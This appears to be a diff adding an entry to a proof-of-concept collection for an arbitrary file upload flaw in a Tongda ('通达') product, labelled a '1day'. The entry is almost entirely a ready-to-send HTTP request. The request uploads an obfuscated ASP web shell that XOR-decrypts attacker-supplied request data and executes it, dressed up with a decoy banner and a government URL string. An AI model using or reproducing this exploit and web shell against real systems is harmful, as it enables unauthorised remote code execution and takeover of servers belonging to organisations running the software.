@@ -1,0 +1,7 @@
+vendor = "通达"
+name = "zwsp-wps2"
+type = "任意文件上传"
+source = "TG"
+date = "08.15"
+poc = "POST /projects/Tools/upload_ajax.ashx?name=test%2eCEr HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Origin: null Connection: close Cookie: ASP.NET_SessionId=qhmszfcvfgyom4cya3ugwrqy Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 730 Hello Administrator! WelCome To Tas9er ASP Console!<% ReSpoNsE.CharSet = \"U\"&\"T\"&\"F\"&\"-\"&Chr(\"56\") govU9j70Rz1=Chr(\"49\")&Chr(\"54\")&\"ac\"&\"acc\"&Chr(\"48\")&Chr(\"53\")&\"aaf\"&Chr(\"97\")&Chr(\"102\")&Chr(\"54\")&\"7\" sEssION(\"gov3waPm\")=\"govucKcEUaYOmjr9\" %><%'govAxedxd%><% SeSsioN(\"k\")=govU9j70Rz1 SeSsIon(\"gov\")=\"https://\"&\"www.\"&\"shanghai.\"&\"gov.\"&\"cn\" govS1g9cc1W=ReQuest.TotalBytes %><%'govVq%><% govgo=REqUesT.BinaryRead(govS1g9cc1W) %><% SesSiOn.ConTentS.REmoVe(\"gov\") %><% FoR govbVy0e3wCX=Chr(\"49\") To govS1g9cc1W govKT6UNr=ascb(midb(govgo,govbVy0e3wCX,Chr(\"49\"))) Xor Asc(Mid(govU9j70Rz1,(govbVy0e3wCX and 15)+Chr(\"49\"),Chr(\"49\"))) govF9Ivuzv=govF9Ivuzv&Chr(govKT6UNr) Next %><%'gov7TPIm%><%ExecUte(govF9Ivuzv) %>"
+label = "1day"
